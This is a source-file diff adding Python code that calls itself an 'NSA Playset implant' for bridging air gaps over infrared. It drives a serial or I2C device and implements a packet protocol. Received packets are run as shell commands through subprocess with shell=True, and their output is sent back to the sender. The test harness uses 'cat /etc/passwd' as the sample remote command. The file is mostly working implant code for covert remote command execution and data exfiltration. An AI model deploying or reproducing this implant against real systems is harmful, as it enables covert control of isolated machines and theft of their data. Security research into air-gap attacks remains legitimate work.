@@ -1,0 +1,351 @@
+#!/usr/bin/python
+#
+# BLINKERCOUGH: NSA Playset implant for IR bridging of airgap
+#
+# Copyright (C) 2015  Hacker, J.R. <r00tkillah@gmail.com>
+#
+# This library is free software; you can redistribute it and/or
+# modify it under the terms of the GNU Lesser General Public
+# License as published by the Free Software Foundation; either
+# version 2.1 of the License, or (at your option) any later version.
+#
+# This library is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+# Lesser General Public License for more details.
+#
+# You should have received a copy of the GNU Lesser General Public
+# License along with this library; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
+
+import time
+import serial
+import binascii
+import select
+import sys
+import os
+import struct
+import random
+import subprocess
+from smbus import SMBus
+
+class SerialDevice:
+    def __init__(self, device_path, baud):
+        self.reset_serial_port(device_path)
+        self.ser = serial.Serial(device_path, baud)
+        self.reset_serial_port(device_path)
+        os.system("stty -F %s echoe echok echoctl echoke" % device_path)
+        self.reset_arduino()
+        self.reset_serial_port(device_path)
+        time.sleep(1)
+        # work around a bug in pyserial where it leaves the port with funny
+        # flags that keep things from working
+        self.wait_for_startup()
+        time.sleep(1)
+
+    def reset_serial_port(self, device_path):
+        os.system("stty -F %s echoe echok echoctl echoke" % device_path)
+
+    def read_input(self):
+        """reads any input and prings out any debug info"""
+        while True:
+            response = self.ser.readline().strip()
+            # print "response '%s'" % response
+            if response.startswith("DBG"):
+                print response
+            elif response:
+                return response
+
+
+    def wait_for_startup(self):
+        while True:
+            response = self.ser.readline().strip()
+            if "Starting" in response:
+                return
+            else:
+                print response
+
+    def reset_arduino(self):
+        self.ser.setDTR(False)
+        time.sleep(.2)
+        self.ser.flushInput()
+        self.ser.flushOutput()
+        self.ser.setDTR(True)
+        time.sleep(0.1)
+
+    def read_register(self, address):
+        cmd = "READ REGISTER %02x\r\n" % address
+        self.ser.write(cmd)
+        response = self.read_input()
+        try:
+            decoded_response = binascii.unhexlify(response)
+        except TypeError:
+            print "couldn't unhexlify '%s'" % response
+            sys.exit(1)
+        return decoded_response
+
+    def write_register(self, address, data):
+        cmd = "WRITE REGISTER %02x %02x\r\n" % (address, data)
+        self.ser.write(cmd)
+        self.ser.flush()
+        time.sleep(0.01)
+
+class i2cDevice:
+    def __init__(self, bus_number):
+        self.BC_addr = 0x25
+        self.bus = SMBus(bus_number)
+
+    def read_register(self, address):
+        self.bus.write_byte(self.BC_addr, address)
+        return self.bus.read_byte(self.BC_addr)
+
+    def write_register(self, address, data):
+        self.bus.write_byte_data(self.BC_addr, address, data)
+
+
+class BlinkerCough:
+    fmt = '=HHB121sH'
+    receive_hook = None # to be called when packet recvd
+
+    def __init__(self, device):
+        """you pass in either a serial thing or an i2c thing"""
+        self.device = device
+        self.address = self.get_address()
+
+    def send_raw(self, data):
+        """to be used for a whole packet"""
+        i = 0
+        for d in data:
+            as_byte = struct.unpack('B', d)[0]
+            sys.stdout.write("[%03d] 0x%02x " % (i, as_byte))
+            if (i+1) % 5 == 0:
+                sys.stdout.write('\n')
+            i += 1
+            self.device.write_register(3, as_byte)
+        sys.stdout.write('\n')
+
+
+    def send(self, destination, data):
+        frame = struct.pack(BlinkerCough.fmt, self.address, destination,
+                            0x00, #type; hops
+                            data,
+                            0x00)  # crc
+        self.send_raw(frame)
+
+    def poll(self):
+        """call this regularly to look for incoming data"""
+        data = []
+        #i = 0
+        while True:
+            rx_depth = self.device.read_register(0)
+            if rx_depth == 0:
+                return
+            c = (self.device.read_register(1))
+            data.append(c)
+            #print "i=%d d=%s" % (i, str(c))
+            time.sleep(0.1)
+            #i+= 1
+        if data:
+            (source, dest, hops, data, crc) = struct.unpack(BlinkerCough.fmt, data)
+            if BlinkerCough.receive_hook:
+                BlinkerCough.receive_hook(source, data)
+
+    def get_address(self):
+        lower = self.device.read_register(4)
+        upper = self.device.read_register(5)
+        return struct.unpack('<H', lower+upper)[0]
+
+    def set_address(self, address):
+        encoded = struct.pack('>H', address)
+        halves = struct.unpack('BB', encoded)
+        self.device.write_register(4, halves[0])
+        self.device.write_register(5, halves[1])
+
+class CommandPacket:
+    """represents a comand packet.  Mostly just serialize and deserialize"""
+    fmt = '<HB113s'
+    magic = 0x1234
+
+    def __init__(self, submagic, data):
+        self.submagic = submagic
+        self.data = data
+
+    def pack(self):
+        return struct.pack(CommandPacket.fmt, CommandPacket.magic,
+                           self.submagic, self.data)
+
+    @classmethod
+    def unpack(cls, data):
+        (magic, submagic, unpacked_data) = struct.unpack(CommandPacket.fmt, data)
+        if magic != CommandPacket.magic:
+            return None
+        return cls(submagic, unpacked_data)
+
+class CommandRunPacket:
+    fmt = '<113s'
+    submagic = 0x1
+
+    def __init__(self, cmd):
+        self.cmd = cmd
+
+    def pack(self):
+        zeros = 112 - len(self.cmd)
+        if zeros > 1:
+            self.cmd += '\x00'
+            self.cmd += '\xFF'*zeros
+        return struct.pack(CommandRunPacket.fmt, self.cmd)
+
+    @classmethod
+    def unpack(cls, data):
+        (unpacked_data) = struct.unpack(CommandRunPacket.fmt, data)
+        cmd = ''
+        for c in unpacked_data[0]:
+            if c == '\x00':
+                break
+            cmd += c
+        return cls(cmd)
+
+class CommandResponsePacket:
+    fmt = '<H111s'
+    submagic = 0x2
+
+    def __init__(self, handle):
+        self.handle = handle
+
+    def pack(self):
+        return struct.pack(CommandResponsePacket.fmt,
+                           self.handle, '\xff'*111)
+
+    @classmethod
+    def unpack(cls, data):
+        (handle, padding) = struct.unpack(CommandResponsePacket.fmt,
+                                          data)
+        return cls(handle)
+
+class CommandOutputPacket:
+        fmt = '<H111s'
+        submagic = 0x3
+
+        def __init__(self, handle, output):
+            self.handle = handle
+            self.output = output
+
+        def pack(self):
+            zeros = 111 - len(self.output)
+            if zeros > 1:
+                self.output += '\x00'
+                self.output += '\xff'*zeros
+            return struct.pack(CommandOutputPacket.fmt,
+                               self.handle,
+                               self.output)
+
+        @classmethod
+        def unpack(cls, data):
+            (handle, output) = struct.unpack(CommandOutputPacket.fmt, data)
+            out = ''
+            for c in output:
+                if c == '\x00':
+                    break
+                out += c
+            return cls(handle, out)
+
+class CommandTerminatedPacket:
+    fmt = '<HH109s'
+    submagic = 0x4
+
+    def __init__(self, handle, returncode):
+        self.handle = handle
+        self.returncode = returncode
+
+    def pack(self):
+        return struct.pack(CommandTerminatedPacket.fmt,
+                           self.handle,
+                           self.returncode,
+                           '\xff'*109)
+
+    @classmethod
+    def unpack(cls, data):
+        (handle, returncode, padding) = struct.unpack(CommandTerminatedPacket.fmt, data)
+        return cls(handle, returncode)
+
+
+class CommandRunner:
+    send_hook = None
+    output_hook = None
+    terminated_hook = None
+
+    def __init__(self):
+        self.handle = None
+        self.state = 'idle'
+
+    def run_remote_command(self, dest, cmd):
+        self.dest = dest
+        run_pkt = CommandRunPacket(cmd)
+        cmd_pkt = CommandPacket(CommandRunPacket.submagic, run_pkt.pack())
+        assert(CommandRunner.send_hook)
+        CommandRunner.send_hook(dest, cmd_pkt.pack())
+
+    def chunkstring(self, string, length):
+        return list((string[0+i:length+i] for i in range(0, len(string), length)))
+
+    def on_recv(self, source, data):
+        cmd_pkt = CommandPacket.unpack(data)
+        if cmd_pkt.submagic == CommandRunPacket.submagic:
+            # we are to run the command
+            run_pkt = CommandRunPacket.unpack(cmd_pkt.data)
+            print "cmd to run is:", run_pkt.cmd
+            rng = random.SystemRandom()
+            handle = rng.randrange(0, pow(2,16))
+            cmdresp = CommandResponsePacket(handle)
+            cmdpkt =  CommandPacket(CommandResponsePacket.submagic, cmdresp.pack())
+            CommandRunner.send_hook(source, cmdpkt.pack())
+            p = subprocess.Popen(run_pkt.cmd, shell=True, stderr = subprocess.STDOUT, stdout = subprocess.PIPE)
+            (stdout, stderr) = p.communicate()
+            outchunks = self.chunkstring(stdout, 111)
+            for chunk in outchunks:
+                outpkt = CommandOutputPacket(handle, chunk)
+                cmdpkt = CommandPacket(CommandOutputPacket.submagic, outpkt.pack())
+                send_hook(source, cmdpkt.pack())
+            termpkt = CommandTerminatedPacket(handle, p.returncode)
+            cmdpkt = CommandPacket(CommandTerminatedPacket.submagic, termpkt.pack())
+            send_hook(source, cmdpkt.pack())
+
+        if cmd_pkt.submagic == CommandResponsePacket.submagic:
+            resp_packet = CommandResponsePacket.unpack(cmd_pkt.data)
+            self.handle = resp_packet.handle
+        elif cmd_pkt.submagic == CommandOutputPacket.submagic:
+            out_pkt = CommandOutputPacket.unpack(cmd_pkt.data)
+            if CommandRunner.output_hook:
+                CommandRunner.output_hook(out_pkt.output)
+        elif cmd_pkt.submagic == CommandTerminatedPacket.submagic:
+            term_pkt = CommandTerminatedPacket.unpack(cmd_pkt.data)
+            if CommandRunner.terminated_hook:
+                terminated_hook(term_pkt.returncode)
+
+if __name__ == "__main__":
+    # test harness of sorts for commandpacket
+    def output_hook(output):
+        print "output:", output
+
+    def terminated_hook(code):
+        print "terminated:", code
+
+    def send_hook(dest, data):
+        print "send_hook"
+        print "dest:", dest
+        print "data:", binascii.hexlify(data)
+
+    cr = CommandRunner()
+    CommandRunner.send_hook = staticmethod(send_hook)
+    CommandRunner.output_hook = staticmethod(output_hook)
+    CommandRunner.terminated_hook = staticmethod(terminated_hook)
+    cr.run_remote_command(0x1234, 'cat /etc/passwd')
+    cr.on_recv(0x1234, CommandPacket(CommandResponsePacket.submagic, CommandResponsePacket(12).pack()).pack())
+    print "recv'd handle is:", cr.handle
+    print "command output is"
+    cr.on_recv(0x1234, CommandPacket(CommandOutputPacket.submagic, CommandOutputPacket(12,'I am output').pack()).pack())
+    cr.on_recv(0x1234, CommandPacket(CommandRunPacket.submagic, CommandRunPacket("cat /etc/passwd").pack()).pack())
+    cr.on_recv(0x1234, CommandPacket(CommandTerminatedPacket.submagic, CommandTerminatedPacket(12, 4).pack()).pack())
+
+    print "running a command"
+    cr.on_recv(0x1234, CommandPacket(CommandRunPacket.submagic, CommandRunPacket('cat /etc/passwd').pack()).pack())
